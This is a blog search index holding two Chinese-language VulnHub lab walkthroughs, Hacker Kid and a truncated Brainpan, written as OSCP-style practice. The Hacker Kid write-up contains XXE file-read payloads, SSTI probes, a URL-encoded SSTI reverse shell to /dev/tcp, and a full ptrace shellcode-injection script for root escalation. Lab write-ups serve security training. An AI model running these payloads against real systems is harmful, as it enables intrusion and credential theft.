<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2_hackerkid_vulnhub</title>
      <link href="/posts/a5e7f10c.html"/>
      <url>/posts/a5e7f10c.html</url>
      
        <content type="html"><![CDATA[<p>靶机下载地址：<a href="https://www.vulnhub.com/entry/hacker-kid-101,719/">https://www.vulnhub.com/entry/hacker-kid-101,719/</a></p><hr><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221107105256207.png"></p><p>靶机IP地址为192.168.71.148</p><h3 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h3><p><img src="/posts/a5e7f10c/image-20221107105505268.png"></p><h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p><img src="/posts/a5e7f10c/image-20221107105740009.png"></p><p>查看了下源码，发现提示page_no参数，先记录，后面再试。</p><p><img src="/posts/a5e7f10c/image-20221107161410887.png"></p><h4 id="9999端口"><a href="#9999端口" class="headerlink" title="9999端口"></a>9999端口</h4><p><img src="/posts/a5e7f10c/image-20221107105915002.png"></p><p>一个登录页面，查看源码有一个隐藏的输入框，名为_xsrf，值为一串数字。</p><p><img src="/posts/a5e7f10c/image-20221107110119438.png"></p><p>查了资料，发现是网页开启了<strong>XSRF保护</strong>，如果请求不带这个参数值就会被拒绝。在这儿似乎也没有什么可利用的。</p><h3 id="目录探测"><a href="#目录探测" class="headerlink" title="目录探测"></a>目录探测</h3><p><img src="/posts/a5e7f10c/image-20221107115155383.png" alt="9999的目录"></p><p><img src="/posts/a5e7f10c/image-20221107115248698.png" alt="80的目录"></p><p>深度扫描文件，用-X参数指定文件类型</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.71.148 <span class="token parameter variable">-X</span> .html,.php,.txt,.old,.bak,.tar,.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221107162027768.png" alt="目录扫描结果"></p><p>看到了两个可用的html文件，app.html和form.html。</p><p><img src="/posts/a5e7f10c/image-20221107162645446.png" alt="app.html"></p><p><img src="/posts/a5e7f10c/image-20221107162713127.png" alt="form.html"></p><p>两个静态页面啥也没有，所谓的“兔子洞”？</p><h3 id="参数爆破"><a href="#参数爆破" class="headerlink" title="参数爆破"></a>参数爆破</h3><p>回到80端口页面源代码中的提示：试一下page_no参数Get请求，查看网页。</p><p>当page_no&#x3D;1时，页面返回一行红色的字：Oh Man !! Isn’t is right to go a little deep inside? 看来不正确，要找出正确的参数值，用burpsuite进行爆破。</p><p><img src="/posts/a5e7f10c/image-20221107163316258.png" alt="image-20221107163316258"></p><p>用burpsuite（社区版）抓包发送到Intruder模块，爆破page_no参数。</p><p><img src="/posts/a5e7f10c/image-20221107165024425.png" alt="image-20221107165024425"></p><p>设置参数值为1~50</p><p><img src="/posts/a5e7f10c/image-20221107165201487.png"></p><p>发送数据包，查看响应包长度，在参数值为21时，长度不同。</p><p><img src="/posts/a5e7f10c/image-20221107165402414.png"></p><p>该页面提示存在子域名 hackers.blackhat.local</p><p><img src="/posts/a5e7f10c/image-20221107165521411.png"></p><p>在&#x2F;etc&#x2F;hosts中添加一条解析记录</p><p><img src="/posts/a5e7f10c/image-20221107170021487.png"></p><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h2><h3 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h3><p>页面提示表示这个黑客创建了许多子域名，思考利用这些子域名作为突破口。根据给出的域名blackhat.local，检测是否存在 <a href="https://blog.51cto.com/u_15704510/5837377">DNS域传送漏洞</a>，找出其他子域名。</p><p><img src="/posts/a5e7f10c/image-20221111091827118.png" alt="dig工具检测"></p><p>可以看到域名服务器返回了全部记录，存在DNS域传送漏洞。</p><p>发现一个可疑的站点，hackerkid.blackhat.local，把它加入hosts文件，然后访问该域名。</p><p><img src="/posts/a5e7f10c/image-20221111093213878.png"></p><p>查看网页源码，发现XML解析函数，可能存在XEE漏洞。</p><p><img src="/posts/a5e7f10c/image-20221111095550041.png"></p><h3 id="XEE注入攻击"><a href="#XEE注入攻击" class="headerlink" title="XEE注入攻击"></a>XEE注入攻击</h3><p><a href="https://xz.aliyun.com/t/3357">XEE(XML External Entity Injection)</a>漏洞是 OWASP TOP 10 漏洞之一，主要是由于XML解析时允许引用外部实体造成的,也称为XML外部实体注入攻击。</p><p>用burpsuite验证目标是否存在xee漏洞。首先，发现email地址处可以回显，那么可以作为注入处，方便查看返回结果。</p><p><img src="/posts/a5e7f10c/image-20221111113003193.png"></p><p>然后外部实体注入，选择查看&#x2F;etc&#x2F;passwd文件，看漏洞是否存在。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY test SYSTEM 'file:///etc/passwd'></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tel</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tel</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>email</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&test;">&amp;test;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>email</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>123<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221111113335209.png"></p><p>看到返回了&#x2F;etc&#x2F;passwd文件内容，存在XEE漏洞！</p><p>尝试读取.bashrc文件，这个文件是用于用户的个性设置的，比如命令别名、环境变量等。在这里我们直接读取是报错的，使用php的base64过滤器进行编码并读取信息。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/home/saket/.bashrc'></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221111115125659.png"></p><p>用decode功能将返回的数据进行base64解码</p><p><img src="/posts/a5e7f10c/image-20221111115305033.png"></p><p>发现一个账密信息。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#Setting Password for running python app</span><span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token string">"admin"</span><span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token string">"Saket!#$%@!!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="SSTI模板注入"><a href="#SSTI模板注入" class="headerlink" title="SSTI模板注入"></a>SSTI模板注入</h3><p>信息收集时，有一个9999端口，是登录界面。尝试用这个账密信息登录。</p><p><img src="/posts/a5e7f10c/237025331b42d1ccd2ec30500e8304ef.png"></p><p>发现登录失败。观察这个账密，密码当中有个关键词Saket，在前面读取&#x2F;etc&#x2F;passwd中，saket账户是这个系统中除root外唯一能够有&#x2F;bin&#x2F;bash的权限，于是尝试使用saket进行登录，密码不变，成功登录！</p><p><img src="/posts/a5e7f10c/image-20221111120136294.png"></p><p><img src="/posts/a5e7f10c/image-20221111120159578.png"></p><p>在前面进行信息收集时，我们已经知道9999端口对应的服务是<strong>Tornado</strong>，这是一个Python的Web服务框架，这个框架是可能存在<a href="https://www.cnblogs.com/bmjoker/p/13508538.html"><strong>SSTI模板注入</strong></a>。</p><blockquote><p>服务器端模板注入（SSTI）：漏洞成因是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎（这里特指用于Web开发的模板引擎）在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。</p></blockquote><p>测试模板注入漏洞：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">$&#123;7*7&#125;,&#123;&#123;7*7&#125;&#125;   &#123;&#123;1+abcxyz&#125;&#125;$&#123;1+abcxyz&#125;&lt;%1+abcxyz%>[abcxyz]   //SSTI通用测试payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第一个payload成功执行，输出了一个49的值，第二个payload是一个模板注入通用payload，页面报错说明存在模板注入漏洞。</p><p><img src="/posts/a5e7f10c/image-20221111161334407.png"></p><p><img src="/posts/a5e7f10c/image-20221111161600301.png"></p><p>既然存在模板注入漏洞，那就可以进行反弹shell的操作，首先在kali上监听端口，并将python反弹shell语句使用<a href="http://tools.jb51.net/static/encodetxt/urlencode_decode/index.html">encodeURIComponent</a>进行编码。</p><pre class="line-numbers language-none"><code class="language-none">编码前：&#123;% import os %&#125;&#123;&#123;os.system(&#39;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.71.139&#x2F;4444 0&gt;&amp;1&quot;&#39;)&#125;&#125; 编码后：%7B%25%20import%20os%20%25%7D%7B%7Bos.system(&#39;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.71.139%2F4444%200%3E%261%22&#39;)%7D%7D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221111163815687.png"></p><p>成功获取了交互式shell！</p><h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>当前用户为saket，需要提升到root权限。</p><h4 id="Capabilitie提权"><a href="#Capabilitie提权" class="headerlink" title="Capabilitie提权"></a>Capabilitie提权</h4><p><strong>Capabilities机制</strong>是在Linux内核2.2之后引入的，原理很简单，就是将之前与超级用户root（UID&#x3D;0）关联的特权细分为不同的功能组，Capabilites作为线程（Linux并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。 这样一来，权限检查的过程就变成了：在执行特权操作时，<strong>如果线程的有效身份不是root，就去检查其是否具有该特权操作所对应的capabilities</strong>，并以此为依据，决定是否可以执行特权操作。 如果Capabilities设置不正确，就会让攻击者有机可乘，实现权限提升。</p><p>使用如下命令发现具有Capabilities特殊操作权限的程序：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/sbin/getcap <span class="token parameter variable">-r</span> / <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token parameter variable">-r</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221111171537947.png"></p><p>通过上图发现python具备<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_sys_ptrace">cap_sys_ptrace+ep</a>能力，利用它进行提权。这里需要用到一个提权脚本，这个脚本的作用就是对root权限的进程注入python类型shellcode，利用python具备的cap_sys_ptrace+ep 能力实现权限提升，该脚本如果执行成功，会在靶机的本地监听5600端口，我们也可以修改shellcode部分让其监听其他端口。</p><p>在kali上编辑以下代码，上传到靶机上执行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> ctypes<span class="token keyword">import</span> sys<span class="token keyword">import</span> struct<span class="token comment"># Macros defined in &lt;sys/ptrace.h></span><span class="token comment"># https://code.woboq.org/qt5/include/sys/ptrace.h.html</span>PTRACE_POKETEXT <span class="token operator">=</span> <span class="token number">4</span>PTRACE_GETREGS <span class="token operator">=</span> <span class="token number">12</span>PTRACE_SETREGS <span class="token operator">=</span> <span class="token number">13</span>PTRACE_ATTACH <span class="token operator">=</span> <span class="token number">16</span>PTRACE_DETACH <span class="token operator">=</span> <span class="token number">17</span><span class="token comment"># Structure defined in &lt;sys/user.h></span><span class="token comment"># https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct</span><span class="token keyword">class</span> <span class="token class-name">user_regs_struct</span><span class="token punctuation">(</span>ctypes<span class="token punctuation">.</span>Structure<span class="token punctuation">)</span><span class="token punctuation">:</span>    _fields_ <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token punctuation">(</span><span class="token string">"r15"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r14"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r13"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r12"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rbp"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rbx"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r11"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r10"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r9"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"r8"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rax"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rcx"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rdx"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rsi"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rdi"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"orig_rax"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rip"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"cs"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"eflags"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"rsp"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"ss"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"fs_base"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"gs_base"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"ds"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"es"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">(</span><span class="token string">"gs"</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_ulonglong<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>libc <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>CDLL<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>pid<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># Define argument type and respone type.</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">.</span>argtypes <span class="token operator">=</span> <span class="token punctuation">[</span>ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_uint64<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_void_p<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_void_p<span class="token punctuation">]</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">.</span>restype <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>c_uint64<span class="token comment"># Attach to the process</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_ATTACH<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>registers<span class="token operator">=</span>user_regs_struct<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># Retrieve the value stored in registers</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_GETREGS<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>byref<span class="token punctuation">(</span>registers<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Instruction Pointer: "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>registers<span class="token punctuation">.</span>rip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Injecting Shellcode at: "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>registers<span class="token punctuation">.</span>rip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c</span>shellcode <span class="token operator">=</span> <span class="token string">"\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"</span><span class="token comment"># Inject the shellcode into the running process byte by byte.</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># Convert the byte to little endian.</span>    shellcode_byte_int<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">[</span>i<span class="token punctuation">:</span><span class="token number">4</span><span class="token operator">+</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    shellcode_byte_little_endian<span class="token operator">=</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;I"</span><span class="token punctuation">,</span> shellcode_byte_int<span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>    shellcode_byte<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>shellcode_byte_little_endian<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token comment"># Inject the byte.</span>    libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_POKETEXT<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>c_void_p<span class="token punctuation">(</span>registers<span class="token punctuation">.</span>rip<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span>shellcode_byte<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Shellcode Injected!!"</span><span class="token punctuation">)</span><span class="token comment"># Modify the instuction pointer</span>registers<span class="token punctuation">.</span>rip<span class="token operator">=</span>registers<span class="token punctuation">.</span>rip<span class="token operator">+</span><span class="token number">2</span><span class="token comment"># Set the registers</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_SETREGS<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> ctypes<span class="token punctuation">.</span>byref<span class="token punctuation">(</span>registers<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Final Instruction Pointer: "</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>registers<span class="token punctuation">.</span>rip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Detach from the process.</span>libc<span class="token punctuation">.</span>ptrace<span class="token punctuation">(</span>PTRACE_DETACH<span class="token punctuation">,</span> pid<span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>kali:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> http.server <span class="token number">8088</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>靶机:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.71.139:8088/inject.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因需要root进程进行注入，编写脚本对root进程批量尝试.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">`</span><span class="token function">ps</span> -ef<span class="token operator">|</span><span class="token function">grep</span> root<span class="token operator">|</span><span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">"grep"</span><span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span><span class="token variable">`</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span> python2.7 inject.py <span class="token variable">$i</span><span class="token punctuation">;</span> <span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221111175514443.png"></p><p>脚本执行成功，可以看到5600端口正在监听。</p><p><img src="/posts/a5e7f10c/image-20221111180927303.png"></p><p>连接5600端口，发现已获取root权限。</p><p><img src="/posts/a5e7f10c/image-20221111181139962.png"></p><p>提权完成！</p>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1_brainpan_vulnhub</title>
      <link href="/posts/229625f.html"/>
      <url>/posts/229625f.html</url>
      
        <content type="html"><![CDATA[<p>brainpan是vulnhub上一个类OSCP风格的靶机。<br>靶机下载地址：<a href="https://www.vulnhub.com/entry/brainpan-1,51/">https://www.vulnhub.com/entry/brainpan-1,51/</a></p><hr><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>首先用nmap扫描靶机开放端口，同时打印banner信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">--script</span> banner <span class="token number">192.168</span>.71.145<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102084915741.png" alt="扫描结果"></p><p>发现靶机开放了9999和10000两个端口。其中10000端口是HTTP服务，9999端口未知，可以尝试用telnet先接入一下。</p><p><img src="/posts/229625f/image-20221102090022123.png" alt="10000端口页面"></p><p><img src="/posts/229625f/image-20221102090054346.png" alt="连接9999端口"></p><p>10000端口看一下网页源码，没发现特别之处。9999端口让输入密码，其它也没什么了。</p><p><img src="/posts/229625f/image-20221102090144519.png" alt="10000端口网页源码"></p><h3 id="目录探测"><a href="#目录探测" class="headerlink" title="目录探测"></a>目录探测</h3><p>利用kali自带的DIRB工具对web目录进行探测。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.71.145:10000 <span class="token parameter variable">-w</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/229625f/image-20221102090246342.png" alt="目录探测"></p><p>发现一个&#x2F;bin目录，访问看看。</p><p><img src="/posts/229625f/image-20221102090352185.png" alt="目录"></p><p>发现一个exe文件，将它下载下来在win7虚拟机里面运行。</p><p><img src="/posts/229625f/image-20221102090424651.png" alt="运行brainpan文件"></p><p>看样子是一个在监听9999端口的程序。<br>用IDA程序可以很容易得看出这个程序存在strcpy()这个危险函数且存在缓冲区溢出漏洞。</p><p><img src="/posts/229625f/image-20221102090510764.png"></p><p><img src="/posts/229625f/image-20221102090518914.png"></p><p>但是在OSCP考试中不允许使用IDA Pro，因此可以先利用strings查看程序中的字符串，看是否存在危险函数。</p><p><img src="/posts/229625f/image-20221102091347540.png"></p><p>发现存在strcpy()危险函数，可能存在缓冲区溢出漏洞。</p><h2 id="2-验证缓冲区溢出漏洞"><a href="#2-验证缓冲区溢出漏洞" class="headerlink" 